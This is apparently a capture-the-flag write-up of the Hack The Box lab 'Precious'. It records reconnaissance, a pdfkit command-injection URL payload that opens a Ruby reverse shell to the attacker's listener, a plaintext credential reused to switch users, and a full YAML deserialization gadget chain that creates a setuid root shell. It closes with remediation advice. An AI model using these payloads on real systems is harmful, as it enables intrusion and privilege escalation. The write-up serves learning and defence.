# Precious Write-Up

Target:10.10.11.189

---

## Introduction

- Objective: Obtain the user and root flag
- Tools: Nmap, FFUF, Python HTTP Server, exiftool, Netcat, Wappalyzer, Burp Suite, scp

---

## Initial Reconnaissance
	- Port Scanning: nmap scan
		- Command: nmap -sC -sV 10.10.11.189
		- Output: 22/tcp open ssh OpenSSH 8.4p1
				  80/tcp open nginx 1.18.0
	- Observations: The scan didn't follow the redirect to precious.htb, I will add this to /etc/hosts and visit the page

---

## Enumeration
	- Service Exploration:
		- Service 1: FFUF
			- Command: ffuf -u http://10.10.11.189/ -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.precious.htb" -fc 302
			- Output: nothing
			
		- Service 2: FFUF
			- Command: ffuf -u http://10.10.11.189/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-directories.txt -fc 302
			- Output: nothing
			
		- Service 3: Python Server
			- Command: python3 -m http.server
			- Output: Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

		- Service 4: exiftool
			- Command: exiftool test.pdf
			- Output: 
						ExifTool Version Number         : 12.57
						File Name                       : test.pdf
						Directory                       : .
						File Size                       : 11 kB
						File Modification Date/Time     : 2025:04:08 15:27:40-04:00
						File Access Date/Time           : 2025:04:08 15:27:40-04:00
						File Inode Change Date/Time     : 2025:04:08 15:28:16-04:00
						File Permissions                : -rw-r--r--
						File Type                       : PDF
						File Type Extension             : pdf
						MIME Type                       : application/pdf
						PDF Version                     : 1.4
						Linearized                      : No
						Page Count                      : 1
						Creator                         : Generated by pdfkit v0.8.6

		- Service 5: netcat
			- Command: nc -lnvp 8000
			- Output: listening on [any] 8000 ...
			
	- Manual Checks: 
		http://precious.htb/ is a 'Convert Web Page to PDF'
		Wappalyzer:
			Web Servers:
				Phusion Passenger 6.0.15
				Nginx 1.18.0
			Reverse Proxies:
				Nginx 1.18.0
		Checked for http://precious.htb/robots.txt , /index.html , /.git/ , /admin/ 
		
	- Key Findings: 
		- trying to turn Google into a pdf results in 'Cannot load remote URL!'
		- Burpsuite shows that XSS Protection is on
		- Ruby is using pdfkit v0.8.6 for pdf document creation
---

## Exploitation
	- Initial Access: Ruby Reverse Shell
		- Command: Enter this website into the prompt
				http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.3","8000"))'`
		- Output: 
				connect to [10.10.16.3] from (UNKNOWN) [10.10.11.189] 57158
				ls
				app
				config
				config.ru
				Gemfile
				Gemfile.lock
				pdf
				public
	- Shell Access: Configuration file for bundle in home directory (.bundle)
		- Command: cat ~/.bundle/config
		- Output: BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
		
		- Command:  su henry
					Password: Q3c1AqGHtoI0aXAYFH
					whoami
		- Output:	henry

## User Flag
	- Command: cat ~/user.txt
	- Output: 9db976c8aa47f5b13f2c1cbfc5ae4524

---

## Privilege Escalation
	- Step 1: Information Gathering:
		- System Info: 
			- Command: uname-a 
			- Outpu: Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 GNU/Linux
			- Command: cat /etc/os-release
			- Output: Debian GNU/Linux 11 (bullseye)
		- User Context:
			- Command: id
			- Output: uid=1000(henry) gid=1000(henry) groups=1000(henry)
		- Automated Tools:
			- Command:
			- Output:
	- Step 2: Identify Vectors:
		- SUID Binaries:
			- Command: find / -u=s -type f 2>/dev/null
			- Output: 
					/usr/bin/newgrp
					/usr/bin/chsh
					/usr/bin/umount
					/usr/bin/chfn
					/usr/bin/sudo
					/usr/bin/su
					/usr/bin/gpasswd
					/usr/bin/passwd
					/usr/bin/mount
					/usr/bin/fusermount
					/usr/lib/dbus-1.0/dbus-daemon-launch-helper
					/usr/lib/openssh/ssh-keysign

		- Cron Jobs:
			- Command: crontab -l
			- Output: no contrab for henry
		- Kernel Exploits:
			- Command: 
			- Output:
		- Misconfigurations:
			- Command: sudo -l
			- Output: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
			
	- Step 3: Exploit the Vector: Update_dependencies.rb has: 
					YAML.load(File.read("dependencies.yml")) -- dependencies.yml is relative path
		- Command: 
				[mrincognito@parrot]$ nano dependencies.yml
					---
					- !ruby/object:Gem::Installer
						i: x
					- !ruby/object:Gem::SpecFetcher
						i: y
					- !ruby/object:Gem::Requirement
					  requirements:
						!ruby/object:Gem::Package::TarReader
						io: &1 !ruby/object:Net::BufferedIO
						  io: &1 !ruby/object:Gem::Package::TarReader::Entry
							 read: 0
							 header: "abc"
						  debug_output: &1 !ruby/object:Net::WriteAdapter
							 socket: &1 !ruby/object:Gem::RequestSet
								 sets: !ruby/object:Net::WriteAdapter
									 socket: !ruby/module 'Kernel'
									 method_id: :system
								 git_set: cp /bin/bash /tmp/creds; chmod 6777 /tmp/creds
							 method_id: :resolve
		
		- Command: scp ~/Desktop/LABS/precious/dependencies.yml henry@10.10.11.189:/tmp/dependencies.yml
		- Command: henry@precious:/tmp/$ sudo ruby /opt/update_dependencies.rb
		- Command: /tmp/creds -p
		- Output: 
				sh: 1: reading: not found
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
				from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
				from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
				from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
				from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
				from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
				from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
				from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
				from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
				from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
				from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
				from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
				from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
				from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
				from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
				from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
				from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
				from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
				from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
				from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
				from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
				from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
				from /opt/update_dependencies.rb:10:in `list_from_file'
				from /opt/update_dependencies.rb:17:in `<main>'

	- Step 4: Verify Access:
		- Command: id 
		- Output:
				id uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)

---

## Post-Exploitation
	- Flag Retrieval:
		- Command: cd /root
				   cat root.txt
		- Output: aba6c2682d51682e67f15ac3fdfce4cf
	- Persistence (Optional):
	- Evidence:

---

## Conclusion

- Summary: 
In "Precious" (10.10.11.189), I used Nmap to find ports 22 and 80, identifying a Ruby web app on precious.htb. Using exiftool, I discovered pdfkit v0.8.6, vulnerable to CVE-2022-25765, and exploited it with a command injection (ruby -rsocket) to gain a shell as ruby. I found credentials in /home/ruby/.bundle/config to switch to henry. For root, I exploited a YAML deserialization flaw in /opt/update_dependencies.rb (run via sudo), crafting a malicious dependencies.yml to execute a command, creating a setuid bash binary, and obtained the flags: user (9db976c8aa47f5b13f2c1cbfc5ae4524) and root (aba6c2682d51682e67f15ac3fdfce4cf).

- Lessons Learned: 
I need to avoid using file:// for web-based LFI attacks when accessing files externally—I spent 3 hours on that dead end. Instead, I should’ve set up a Python server to host a page for the pdfkit exploit, which would’ve saved me a lot of time. I also got stuck trying to extract info from precious.htb with LFI, when I should’ve focused on the command injection path. Looking back, searching for 'YAML known exploits' earlier could’ve helped me find the deserialization attack faster, instead of struggling with Ruby gems for hours. I didn’t need to make a gem at all—the YAML method was simpler, but I had no clue since I’d never seen Ruby before. I should’ve pivoted quicker when I saw I was going nowhere, and I need to get better at recognizing when a box is pushing me to learn a new language or technique, so I can research more efficiently.

- Fixes:
Update pdfkit to Fix Command Injection (CVE-2022-25765): Upgrade pdfkit to version 0.8.7.2 or later, which patches CVE-2022-25765 by sanitizing URL parameters to prevent command injection.

Sanitize URL Inputs in Web Application: Add input validation in the Ruby web app to block special characters (e.g., backticks, spaces) in URL parameters, stopping command execution.

Secure Credentials in Configuration Files: Remove plaintext credentials from /home/ruby/.bundle/config and use environment variables or a secure vault (e.g., HashiCorp Vault) to store sensitive data like API keys.

Restrict File Permissions for Sensitive Configs: Change permissions on /home/ruby/.bundle/config to 600 (read/write for owner only) to prevent unauthorized access by other users.

Use Safe YAML Loading in Ruby Script: Replace YAML.load with YAML.safe_load in /opt/update_dependencies.rb to prevent deserialization of arbitrary Ruby objects, blocking command execution.

Use Absolute Path for dependencies.yml: Modify /opt/update_dependencies.rb to use an absolute path (/opt/dependencies.yml) instead of a relative path, preventing user-controlled files from being loaded.

Restrict sudo Privileges for Ruby Script: Remove henry’s NOPASSWD sudo access to /usr/bin/ruby /opt/update_dependencies.rb in /etc/sudoers, or require a password to limit unauthorized root access.

---

## Appendix

- Additional Details:
Two resources I used to solve this box-
	https://0xdf.gitlab.io/2023/05/20/htb-precious.html
	https://www.elttam.com/blog/ruby-deserialization/
	
- Tools and Exploits:
	- Nmap
	- FFUF
	- Python HTTP Server (python3 -m http.server)
	- exiftool
	- Netcat (nc)
	- Wappalyzer
	- Burp Suite
	- CVE-2022-25765 (pdfkit command injection)
	- Ruby YAML Deserialization Exploit
	- scp

